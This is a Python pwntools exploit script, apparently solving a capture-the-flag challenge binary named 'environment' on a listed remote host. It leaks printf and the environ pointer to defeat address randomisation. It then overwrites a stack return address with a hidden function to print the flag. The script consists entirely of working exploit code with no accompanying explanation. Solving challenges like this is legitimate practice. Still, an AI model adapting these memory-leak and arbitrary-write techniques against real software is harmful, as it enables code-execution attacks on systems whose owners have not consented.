from pwn import *

binary = context.binary = ELF('./environment')

if args.REMOTE:
        libc = ELF('./libc.so.6')
        p = remote('188.166.172.13',30111)
else:
	# When we running locally use this libc, in remote we will use the attached libc
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
        p = process(binary.path)



#leak printf address
for _ in range(5):
	p.sendlineafter('>','2')
	p.sendlineafter('>','1')
	p.sendlineafter('>','n')

data=p.recvuntil(']').decode('utf-8').split('[')[-1].split(']')[0] #.strip('\x1b[0m[')
libc_leak_printf=int(data,16)
log.info("printf leak address: " + hex(libc_leak_printf))
libc.address = libc_leak_printf - libc.sym.printf
log.info("libc.address: " + hex(libc.address))

#leak envior address
for _ in range(5):
        p.sendlineafter('>','2')
        p.sendlineafter('>','1')
        p.sendlineafter('>','n')

p.sendlineafter('> ',hex(libc.sym.environ))
p.recv(4) # ANSI color
data = p.recv(6)
environ = u64(data + b'\0\0')
log.info('environ address: ' + str(hex(environ)))


#Write address of hidden_resource to environ-0x120 (calculated using p/x (long)(environ)-(long)$rsp on plant function)
p.sendlineafter('>','1')
p.sendlineafter('>',hex(environ-0x120))
p.sendlineafter('>',hex(binary.sym.hidden_resources))
print(p.recvuntil('}'))